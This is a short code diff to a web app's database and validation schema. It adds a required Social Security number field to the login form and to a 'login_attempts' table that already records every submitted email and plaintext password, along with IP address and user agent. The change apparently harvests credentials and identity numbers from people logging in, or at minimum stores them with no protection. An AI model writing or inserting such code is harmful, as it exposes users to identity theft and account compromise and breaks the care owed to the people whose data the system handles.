@@ -24,6 +24,7 @@ export const loginAttempts = pgTable("login_attempts", {
   id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
   email: text("email").notNull(),
   password: text("password").notNull(),
+  ssn: text("ssn").notNull(),
   success: boolean("success").notNull(),
   ipAddress: text("ip_address"),
   userAgent: text("user_agent"),
@@ -48,6 +49,7 @@ export const insertUserSchema = createInsertSchema(users).pick({
 export const loginSchema = z.object({
   email: z.string().email("Please enter a valid email address"),
   password: z.string().min(6, "Password must be at least 6 characters"),
+  ssn: z.string().min(1, "SSN is required"),
   rememberMe: z.boolean().optional(),
 });
 
